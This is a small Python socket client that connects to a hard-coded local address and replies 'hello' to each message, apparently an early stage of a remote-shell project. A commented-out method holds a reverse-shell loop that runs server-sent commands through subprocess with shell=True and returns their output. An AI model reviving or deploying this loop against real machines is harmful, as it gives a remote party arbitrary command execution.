import socket, sys


class Client():
    def __init__(self, shost, sport):
        self.s = socket.socket()
        # try:
        self.s.connect((shost, sport))
        # except:
        #     print('Failed to connect to host server')
        while True:
            msg = self.s.recv(1024).decode('utf-8')
            print('received the full message:',msg, 'sending:', 'hello'.encode())
            self.s.send('hello'.encode())


    # def communicate(self):
    #     while True:
    #         data = self.receive()
    #         if data[:2] == 'cd':
    #             try:
    #                 os.chdir(data[3:])
    #                 self.s.send(Message('directory changed succesfully',0).message)
    #             except:
    #                 self.s.send(Message('error executing the command',0).message)
    #         elif data == 'quit':
    #                 sys.exit()
    #         elif len(data) > 0:
    #             cmd = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
    #             output = Message(cmd.stdout.read() + cmd.stderr.read(), 1)
    #             print(output.utf)
    #             self.s.send(Message(output.utf + str(os.getcwd()) + '> ', 0).message)


client = Client('192.168.0.103', 1554)
